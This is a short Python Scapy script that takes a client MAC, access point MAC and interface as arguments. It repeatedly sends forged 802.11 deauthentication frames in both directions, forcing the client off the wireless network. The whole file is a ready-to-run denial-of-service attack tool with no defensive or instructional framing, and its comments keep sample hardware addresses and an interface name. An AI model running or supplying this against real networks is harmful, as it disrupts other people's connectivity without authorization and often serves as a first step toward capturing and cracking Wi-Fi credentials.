from scapy.all import *
import os
import sys


client = sys.argv[1]
ap = sys.argv[2]
nic = sys.argv[3]
# 802.11 frame
# addr1: 3C:22:FB:73:44:97 
# addr2: source MAC
# addr3: B4:75:0E:DF:9B:C5

# stack them up

# Deauthentication Packet For Access Point
pkt_to_ap = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

# Deauthentication Packet For Client
pkt_to_c = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()

#dot11 = Dot11(addr1=client, addr2=ap, addr3=ap)
#dot22 = Dot11(addr1=ap, addr2=client, addr3=client)
# packet = RadioTap()/dot11/Dot11Deauth(reason=7)
#pkt_to_ap = RadioTap()/dot11/Dot11Deauth(reason=7)
#pkt_to_c = RadioTap()/dot22/Dot11Deauth(reason=7)

count=100

while count != 0:
	for i in range(50):

		print ("sending client to ap")
		#sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_ap, iface=nic)
		print ("sending ap to client")
		#sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_c, iface=nic)


	count-=1



# send the packet
#sendp(packet, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)

